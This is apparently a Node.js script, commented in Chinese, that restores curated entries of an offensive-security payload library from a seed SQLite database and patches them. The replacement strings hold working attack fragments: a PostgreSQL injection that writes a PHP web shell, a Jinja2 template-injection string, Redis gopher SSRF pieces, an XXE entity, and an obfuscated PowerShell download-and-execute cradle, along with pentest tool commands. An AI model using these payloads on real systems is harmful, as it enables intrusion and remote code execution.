// 策展版恢复 + P1 字符串级补丁：从 git 原种子（策展版）读 6 个 payload，
// 在策展文本上打最小补丁（不整条覆盖），回写 runtime；同时恢复 20 个工具的策展版并打补丁。
import { DatabaseSync } from 'node:sqlite';

const orig = new DatabaseSync('./orig-seed-tmp.sqlite', { readOnly: true });
const rt = new DatabaseSync('data/payloader.sqlite');
const nowIso = new Date().toISOString();

// —— payload 补丁（策展版 + 最小字符串替换）——
const payloadPatches = [
  ['ssti-jinja2', '\\x5f\\x5fcla\\x5f\\x5fss', '\\x5f\\x5fclass\\x5f\\x5f'],
  ['ssti2-jinja2-python-flask', '\\x5f\\x5fcla\\x5f\\x5fss', '\\x5f\\x5fclass\\x5f\\x5f'],
  ['sqli-postgresql-server-file-write', "' UNION SELECT 'test',COPY (SELECT '<?php system($_GET[c]);?>') TO '/var/www/html/shell.php'--", "'; COPY (SELECT '<?php system($_GET[c]);?>') TO '/var/www/html/shell.php'--"],
  ['sqli-stacked-postgresql', "' UNION SELECT 'test',COPY (SELECT '<?php system($_GET[c]);?>') TO '/var/www/html/shell.php'--", "'; COPY (SELECT '<?php system($_GET[c]);?>') TO '/var/www/html/shell.php'--"],
  ['ssrf-gopher', '$28%0d%0a%0a%0a%0a*/1', '$57%0d%0a%0a%0a%0a*/1'],
  ['ssrf-redis', '$28%0d%0a%0a%0a%0a*/1', '$57%0d%0a%0a%0a%0a*/1'],
  ['cmdi2-gopher-redis-resp-file-write-sequence', '$28%0d%0a%0a%0a%0a*/1', '$57%0d%0a%0a%0a%0a*/1'],
  ['xxe-oob', '<foo><![CDATA[&xxe;]]></foo>', '<foo>&xxe;</foo>'],
  ['xxe-oob', '实体引用在CDATA之前被解析展开', '实体引用在元素内容中被解析展开（CDATA 段内不解析实体）'],
  ['evasion-powershell', '${1}=\'IEX\'; ${2}=\'(New-Object Net.WebClient).DownloadString\'; Invoke-Expression "${1} ${2}"', '\\${1}=\'IEX\'; \\${2}=\'(New-Object Net.WebClient).DownloadString\'; Invoke-Expression "\\${1} \\${2}"'],
];

const patchObject = (value, patches) => {
  const json = JSON.stringify(value);
  let next = json;
  let applied = 0;
  for (const [from, to] of patches) {
    while (next.includes(JSON.stringify(from).slice(1, -1))) {
      next = next.replace(JSON.stringify(from).slice(1, -1), JSON.stringify(to).slice(1, -1));
      applied += 1;
    }
  }
  return { value: JSON.parse(next), applied };
};

const updatePayload = rt.prepare('UPDATE payloads SET data = ?, updated_at = ? WHERE id = ?');
const perPayload = new Map();
for (const [id, from, to] of payloadPatches) {
  if (!perPayload.has(id)) perPayload.set(id, []);
  perPayload.get(id).push([from, to]);
}
let restored = 0;
for (const [id, patches] of perPayload) {
  const origRow = orig.prepare('SELECT data FROM payloads WHERE id = ?').get(id);
  if (!origRow) { console.log('skip(原种子无):', id); continue; }
  const { value, applied } = patchObject(JSON.parse(origRow.data), patches);
  updatePayload.run(JSON.stringify(value), nowIso, id);
  restored += 1;
  console.log(`payload ${id}: 补丁 ${applied} 处`);
}

// —— 工具补丁（同样策展版 + 最小替换）——
const toolPatches = new Map([
  ['kerbrute-tool', [["kerbrute -d domain.com --dc dc_ip user:password", "kerbrute passwordspray -d domain.com --dc dc_ip -u username wordlist.txt"]]],
  ['graphqlmap', [
    ['-x dump_schema', '--method POST 后进入交互 shell 执行 dump_schema'],
    ['-x enum', '--method POST 后进入交互 shell 执行 enum'],
    ['-x nosqli', '--method POST 后进入交互 shell 执行 nosqli'],
  ]],
  ['smb-pentest', [['hascat -m 5600', 'hashcat -m 5600']]],
  ['linux-privesc-gtfobins', [['cP /tmp/fakepwd', 'cp /tmp/fakepwd']]],
  ['gitleaks', [['gitleaks detect --source .', 'gitleaks git .']]],
]);
const updateTool = rt.prepare('UPDATE tools SET data = ?, updated_at = ? WHERE id = ?');
for (const [id, patches] of toolPatches) {
  const origRow = orig.prepare('SELECT data FROM tools WHERE id = ?').get(id);
  const rtRow = origRow ? null : rt.prepare('SELECT data FROM tools WHERE id = ?').get(id);
  const source = origRow || rtRow;
  if (!source) { console.log('skip(无):', id); continue; }
  const { value, applied } = patchObject(JSON.parse(source.data), patches);
  updateTool.run(JSON.stringify(value), nowIso, id);
  console.log(`tool ${id}: 补丁 ${applied} 处（${origRow ? '策展版' : 'runtime 版'}）`);
}
console.log(`恢复+补丁完成：payloads ${restored}`);
orig.close();
rt.close();
